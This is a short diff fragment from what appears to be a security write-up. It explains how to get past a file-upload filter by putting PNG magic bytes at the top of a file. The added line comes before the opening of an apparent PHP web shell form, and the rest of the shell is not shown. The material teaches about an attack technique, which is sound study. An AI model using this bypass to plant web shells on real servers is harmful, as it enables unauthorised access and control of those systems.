@@ -18,6 +18,7 @@ Verifies the file's digital signature, or Magic Bytes, to ensure it is a genuine
 to bypass filter we need add Magic Bytes to our file ,in our case we can add PNG on first line of file like this
 <img width="1598" height="825" alt="5" src="https://github.com/user-attachments/assets/f91fc941-3c75-472d-840f-00b94088b58e" />
 
+     PNG
     <html>
     <body>
     <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
